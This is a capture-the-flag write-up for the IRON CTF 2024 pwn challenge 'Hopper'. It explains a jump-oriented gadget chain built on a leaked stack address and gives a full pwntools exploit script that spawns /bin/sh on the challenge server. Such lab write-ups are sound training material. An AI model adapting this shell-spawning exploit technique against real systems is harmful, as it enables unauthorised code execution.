---
title: "Hopper - IRON CTF 2024"
category: "pwn"
subcategory: "static-analysis"
type: "writeup"
tags: ["pwn", "xor", "ida", "checksec", "hopper", "static-analysis", "iron-ctf", "iron-ctf-2024", "2024", "ctf-writeup"]
summary: "Hippety-hop... Hippety-hop your way to victory!"
source:
  name: "CTFtime writeup #39555"
  url: "https://ctftime.org/writeup/39555"
original_source: "https://kliprmimo.github.io/posts/Hopper/"
ctf:
  name: "IRON CTF 2024"
  year: 2024
  challenge: "Hopper"
---

## Metadata

- **CTF:** IRON CTF 2024
- **Task:** Hopper
- **Author team:** hack_2ah
- **CTFtime tags:** pwn
- **CTFtime:** <https://ctftime.org/writeup/39555>
- **Original writeup:** <https://kliprmimo.github.io/posts/Hopper/>

---
# Hopper  
## Description  
Hippety-hop... Hippety-hop your way to victory!

Ctf: ironctf2024 https://ctf.1nf1n1ty.team/challenges#Hopper-15

Author: Vigneswar

Category: pwn

`nc pwn.1nf1n1ty.team 31886`

## Writeup  
### Overview  
In this challenge we are given only binary without source code so we need to make use of IDA free to see what this binary does.  
But first we check what is this file using `file` program  
![](<https://raw.githubusercontent.com/Kliprmimo/CTF_writeups_PUBLIC/main/hopper/attachments/Pasted%20image%2020241006121743.png>)  
we also `checksec` to find out what security features does this binary have  
![](<https://raw.githubusercontent.com/Kliprmimo/CTF_writeups_PUBLIC/main/hopper/attachments/Pasted%20image%2020241006121915.png>)  
from this we could say that this is nearly perfect binary for pwning, but life is not all roses and we cannot execute code from the stack.  
Lets take look at what is inside, shall we?

![](<https://raw.githubusercontent.com/Kliprmimo/CTF_writeups_PUBLIC/main/hopper/attachments/Pasted%20image%2020241006122327.png>)

there is not even main function in this programme so we take a look at `start` .  
What it does is:  
\- print a bunny ascii image  
\- print retaddr (very important for us)  
\- print "hop hop" as ascii image  
\- takes our input to a stack  
\- jumps to an address that that is at the top of our input

Why is this retaddr important for us?  
Thanks to it we can find out where is stack located, and we can reference addresses according to this leaked address.  
Luckily for us we are provided some gadgets that can help us exploit this challenge.

![](<https://raw.githubusercontent.com/Kliprmimo/CTF_writeups_PUBLIC/main/hopper/attachments/Pasted%20image%2020241006123411.png>)  
![](<https://raw.githubusercontent.com/Kliprmimo/CTF_writeups_PUBLIC/main/hopper/attachments/Pasted%20image%2020241006123425.png)!>[](<https://raw.githubusercontent.com/Kliprmimo/CTF_writeups_PUBLIC/main/hopper/attachments/Pasted%20image%2020241006123440.png)!>[](<https://raw.githubusercontent.com/Kliprmimo/CTF_writeups_PUBLIC/main/hopper/attachments/Pasted%20image%2020241006123711.png>)  
### Plan for an exploit  
Since we cannot execute the code from the stack we need to use provided gadgets to execute `syscall` of `execve`. What this means is we have to set some registers according to requirements  
[[x64.syscall.sh](http://x64.syscall.sh)](<https://x64.syscall.sh/>)

![](<https://raw.githubusercontent.com/Kliprmimo/CTF_writeups_PUBLIC/main/hopper/attachments/Pasted%20image%2020241006123857.png>)  
\- `RAX` has to be `0x3B`  
\- `RDI` has to be pointer to the beginning of `/bin/sh` string  
\- `RSI` has to be `0`  
\- `RDX` has to be `0`  
and we need to execute `syscall` after that

How do we control the flow of the programme using those gadgets?   
If we put address of dispatcher in `r15` (address that is jumped to at the end of most of the gadgets) we can use it to jump to some gadget like

![](<https://raw.githubusercontent.com/Kliprmimo/CTF_writeups_PUBLIC/main/hopper/attachments/Pasted%20image%2020241006124910.png>)

and then jump back to `r15` - dispatcher   
what dispatcher does is it increases value in `rbx` by `8` and jumps to address that is pointed by address in this register. So we can essentially use it to walk the gadgets of which we put addresses on the stack.  
### Actual exploit  
In order to do that we can put an address of gadgets at the top:  
\- address of `gadgets` gets popped of to `rsi`  
\- address of `/bin/sh\x00` gets popped of to `rdi`  
\- address of we leaked earlier gets popped of to `rbx` (this is the address that will be used by dispatcher)  
\- value of `0x3B` gets popped of to `r13`  
\- address of `dispacher` gets popped to `r15`  
\- we jump to `disparcher`   
\- `dispacher` jumps to itself  
\- `dispatcher` jumps to gadgets that clears `rsi`  
\- `dispatcher` jumps to `xchg rax, r13` to set rax to be `0x3b`  
\- from there we jump to address that is at `rsp`  
\- from `dispatcher` we once again clear `rsi`  
\- from `dispatcher` we once again clear `rdx`  
\- finally we jump to `syscall`

Code:  
```python  
from pwn import remote, p64, u64

conn = remote("pwn.1nf1n1ty.team", 31886)

msg = conn.recvuntil(b'>>')  
addr = msg[379: 379 + 8]

addr_int = u64(addr)  
bin_sh_addr = addr_int + 8 * 6

gadget_chain = 0x401017  
dispatcher_addr = 0x401011  
xor_rsi = 0x401027  
xchg_rax_r13 = 0x40100c  
xor_rdx = 0x401021  
syscall = 0x40100a

payload = p64(gadget_chain)  
payload += p64(bin_sh_addr) # rdi  
payload += p64(addr_int) # rbx  
payload += p64(0x3b) # r13 (later rax)  
payload += p64(dispatcher_addr) # r15 dispatcher  
payload += p64(xor_rsi) # clear rsi  
payload += p64(xchg_rax_r13) # swap rax and r13  
payload += p64(xor_rdx) # clear rdx  
payload += p64(syscall) # syscall  
payload += b'/bin/sh\x00'

conn.sendline(payload)  
conn.interactive()  
```  
### Pro tip  
if you don't include null byte at the end of `/bin/sh` you might find yourself debugging for few additional hours
